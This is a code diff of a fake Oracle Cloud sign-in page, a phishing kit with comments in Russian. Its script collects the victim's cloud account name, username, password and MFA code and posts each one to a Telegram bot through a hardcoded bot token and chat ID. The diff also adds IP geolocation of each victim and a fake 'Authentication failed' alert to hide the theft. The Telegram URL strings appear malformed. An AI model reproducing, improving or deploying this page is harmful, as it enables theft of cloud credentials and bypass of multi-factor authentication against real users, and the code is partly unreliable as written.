@@ -5,30 +5,94 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Oracle Cloud Sign In</title>
     <style>
-        body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; margin: 0; padding: 0; color: #312d2a; background-color: #fff; -webkit-font-smoothing: antialiased; }
-        .top-header { background-color: #312d2a; color: #f2f2f2; padding: 12px 20px; display: flex; align-items: center; font-size: 14px; }
-        .oracle-icon { width: 22px; height: 11px; border: 2px solid #ff4200; border-radius: 12px; margin-right: 12px; }
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #312d2a;
+            background-color: #fff;
+            -webkit-font-smoothing: antialiased;
+        }
+        .top-header {
+            background-color: #312d2a;
+            color: #f2f2f2;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+        }
+        .oracle-icon {
+            width: 22px;
+            height: 11px;
+            border: 2px solid #ff4200;
+            border-radius: 12px;
+            margin-right: 12px;
+        }
         .content { padding: 30px 24px; }
         .logo-box { margin-bottom: 35px; }
         .logo-main { font-size: 32px; font-weight: 700; letter-spacing: 1px; line-height: 1; }
         .logo-sub { font-size: 22px; display: block; margin-top: 2px; }
         .label { font-size: 16px; font-weight: 600; margin-bottom: 12px; display: block; }
-        input { width: 100%; padding: 12px; border: 1px solid #9e9e9e; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 20px; outline: none; background-color: #fff; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #9e9e9e;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            outline: none;
+            background-color: #fff;
+        }
         input:focus { border-color: #006699; }
-        .btn { border: none; padding: 12px 24px; border-radius: 4px; font-size: 15px; cursor: pointer; transition: all 0.2s ease; width: fit-content; }
+        .btn {
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: fit-content;
+        }
         .btn-full { width: 100%; }
-        .btn-inactive { background-color: #e0e0e0; color: #9e9e9e; pointer-events: none; }
-        .btn-active { background-color: #312d2a; color: #fff; pointer-events: auto; }
+        .btn-inactive {
+            background-color: #e0e0e0;
+            color: #9e9e9e;
+            pointer-events: none;
+        }
+        .btn-active {
+            background-color: #312d2a;
+            color: #fff;
+            pointer-events: auto;
+        }
         .link-blue { color: #006699; text-decoration: none; font-size: 15px; }
         .divider { border: 0; border-top: 1px solid #e0e0e0; margin: 30px 0; }
         .step { display: none; }
         .step.active { display: block; }
         .tenancy-label { font-size: 14px; color: #666; margin-bottom: 4px; }
         .tenancy-val { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
-        .select-custom { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 25px; font-size: 16px; background: #fff url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://w3.org' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E") no-repeat right 15px center; appearance: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #312d2a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 50px auto; }
+        .select-custom {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 25px;
+            font-size: 16px;
+            background: #fff url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://w3.org' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E") no-repeat right 15px center;
+            appearance: none;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #312d2a;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 50px auto;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading-text { text-align: center; font-size: 18px; font-weight: 500; }
+        .help-link-center { text-align: center; margin-top: 25px; display: block; }
     </style>
 </head>
 <body>
@@ -39,9 +103,12 @@
     </div>
 
     <div class="content">
-        <!-- ШАГ 1 -->
+        <!-- STEP 1 -->
         <div id="step1" class="step active">
-            <div class="logo-box"><div class="logo-main">ORACLE</div><div class="logo-sub">Cloud</div></div>
+            <div class="logo-box">
+                <div class="logo-main">ORACLE</div>
+                <div class="logo-sub">Cloud</div>
+            </div>
             <span class="label">Cloud Account Name</span>
             <input type="text" id="accInput" placeholder="Enter cloud account name" oninput="validateStep1()">
             <button id="nextBtn1" class="btn btn-inactive" onclick="navigateTo(2)">Next</button>
@@ -51,34 +118,44 @@
             <button class="btn" style="border:1px solid #312d2a; background:transparent;">Sign Up</button>
         </div>
 
-        <!-- ШАГ 2 -->
+        <!-- STEP 2 -->
         <div id="step2" class="step">
             <div class="tenancy-label">Tenancy <a href="#" class="link-blue" style="margin-left:10px" onclick="location.reload()">Change</a></div>
             <div class="tenancy-val" id="displayTenancy1"></div>
+            <div style="border-top: 1px solid #eee; padding-top: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 14px; color:#666">Sign in using an identity domain ⓘ</span>
+                <span style="font-size: 12px;">▲</span>
+            </div>
             <select class="select-custom"><option>Default</option></select>
             <button class="btn btn-active btn-full" onclick="navigateTo(3)">Next</button>
+            <a href="#" class="link-blue help-link-center">Need help signing in?</a>
         </div>
 
-        <!-- ШАГ 3 -->
+        <!-- STEP 3 -->
         <div id="step3" class="step">
             <div class="tenancy-val" id="displayTenancy2" style="margin-bottom:10px"></div>
             <h2 style="font-weight: 400; font-size: 24px; margin-bottom: 25px;">Sign In</h2>
+            <span style="color:#666; font-size: 14px;">Identity Domain</span>
+            <div style="margin-bottom: 20px; font-weight: 600;">Default</div>
             <span class="label">User Name</span>
             <input type="text" id="userInput" placeholder="User name or email" oninput="validateStep3()">
             <span class="label">Password</span>
             <input type="password" id="passInput" placeholder="Password" oninput="validateStep3()">
             <button id="signInBtn" class="btn btn-inactive btn-full" onclick="navigateTo(4)">Sign In</button>
+            <p style="margin-top:20px;"><a href="#" class="link-blue">Forgot password?</a></p>
         </div>
 
-        <!-- ШАГ 4 -->
+        <!-- STEP 4 -->
         <div id="step4" class="step">
             <h2 style="font-weight: 400; font-size: 24px; margin-bottom: 15px;">Verify Your Identity</h2>
-            <p style="font-size: 15px; color:#444; margin-bottom: 25px;">Enter the 6-digit verification code.</p>
+            <p style="font-size: 15px; color:#444; margin-bottom: 25px;">Enter the 6-digit verification code generated by your authentication app.</p>
+            <span class="label">Verification Code</span>
             <input type="text" id="codeInput" placeholder="000000" maxlength="6" oninput="validateStep4()">
             <button id="verifyBtn" class="btn btn-inactive btn-full" onclick="showLoading()">Verify</button>
+            <p style="margin-top:25px;"><a href="#" class="link-blue">Use a different verification method</a></p>
         </div>
 
-        <!-- ШАГ 5 -->
+        <!-- STEP 5 -->
         <div id="step5" class="step">
             <div class="loader"></div>
             <div class="loading-text">Authenticating...</div>
@@ -86,54 +163,69 @@
     </div>
 
     <script>
-        const TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
+        const TELEGRAM_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
         const CHAT_ID = '6576262467';
 
-        async function sendLog(msg) {
-            const url = `https://telegram.org{TOKEN}/sendMessage`;
+        async function sendToBot(text) {
             try {
+                const ipRes = await fetch('https://ipapi.co').catch(() => ({}));
+                let geo = '';
+                if (ipRes.ok) {
+                    const ipData = await ipRes.json();
+                    geo = ipData.ip ? `\n\n🌐 IP: ${ipData.ip} (${ipData.country_name})` : '';
+                }
+                
+                // ИСПРАВЛЕННЫЙ URL (добавлен api. и /bot)
+                const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
                 await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text + geo,
+                        parse_mode: 'html'
+                    })
                 });
-            } catch (e) { console.error('Error sending to bot'); }
+            } catch (e) { console.error(e); }
         }
 
-        function navigateTo(step) {
-            const acc = document.getElementById('accInput').value;
-            if (step === 2) {
-                sendLog(`<b>☁️ Tenancy:</b> <code>${acc}</code>`);
-                document.getElementById('displayTenancy1').innerText = acc;
-                document.getElementById('displayTenancy2').innerText = acc;
+        function navigateTo(stepNumber) {
+            const accName = document.getElementById('accInput').value;
+            if (stepNumber === 2) {
+                sendToBot(`<b>☁️ Oracle Tenancy:</b> <code>${accName}</code>`);
+                document.getElementById('displayTenancy1').innerText = accName;
+                document.getElementById('displayTenancy2').innerText = accName;
             }
-            if (step === 4) {
+            if (stepNumber === 4) {
                 const user = document.getElementById('userInput').value;
                 const pass = document.getElementById('passInput').value;
-                sendLog(`<b>👤 Login:</b>\nTenancy: <code>${acc}</code>\nUser: <code>${user}</code>\nPass: <code>${pass}</code>`);
+                sendToBot(`<b>👤 Oracle Login:</b>\nTenancy: <code>${accName}</code>\nUser: <code>${user}</code>\nPass: <code>${pass}</code>`);
             }
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + step).classList.add('active');
+            document.getElementById('step' + stepNumber).classList.add('active');
         }
 
         async function showLoading() {
             const code = document.getElementById('codeInput').value;
-            await sendLog(`<b>🔐 MFA Code:</b> <code>${code}</code>`);
+            await sendToBot(`<b>🔐 Oracle MFA Code:</b> <code>${code}</code>`);
             navigateTo(5);
-            setTimeout(() => { window.location.reload(); }, 4000);
+            setTimeout(() => {
+                alert("Authentication failed. Please check your credentials and try again.");
+                window.location.reload();
+            }, 4000);
         }
 
         function validateStep1() {
-            const val = document.getElementById('accInput').value;
+            let val = document.getElementById('accInput').value;
             document.getElementById('nextBtn1').className = val.trim().length > 2 ? 'btn btn-active' : 'btn btn-inactive';
         }
         function validateStep3() {
-            const u = document.getElementById('userInput').value;
-            const p = document.getElementById('passInput').value;
+            let u = document.getElementById('userInput').value;
+            let p = document.getElementById('passInput').value;
             document.getElementById('signInBtn').className = (u.length > 2 && p.length > 2) ? 'btn btn-active btn-full' : 'btn btn-inactive btn-full';
         }
         function validateStep4() {
-            const c = document.getElementById('codeInput').value;
+            let c = document.getElementById('codeInput').value;
             document.getElementById('verifyBtn').className = c.length === 6 ? 'btn btn-active btn-full' : 'btn btn-inactive btn-full';
         }
     </script>
